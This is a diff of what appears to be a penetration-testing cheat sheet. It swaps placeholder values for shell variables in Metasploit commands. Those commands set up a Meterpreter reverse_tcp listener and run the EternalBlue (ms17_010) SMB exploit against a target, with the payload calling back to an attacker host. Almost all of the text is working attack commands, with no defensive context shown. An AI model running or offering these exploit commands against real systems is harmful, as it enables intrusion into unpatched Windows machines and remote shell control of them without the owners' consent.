@@ -10,7 +10,7 @@
 ```bash
 use exploit/multi/handler
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
-set LHOST <attacker-ip>
+set LHOST $LHOST
 set LPORT 4444
 set ExitOnSession false
 exploit -j
@@ -28,9 +28,9 @@ msfconsole -r handler.rc
 
 ```bash
 use exploit/windows/smb/ms17_010_eternalblue
-set RHOSTS 10.10.10.10
+set RHOSTS $IP
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
-set LHOST <attacker-ip>
+set LHOST $LHOST
 set LPORT 4444
 run
 ```
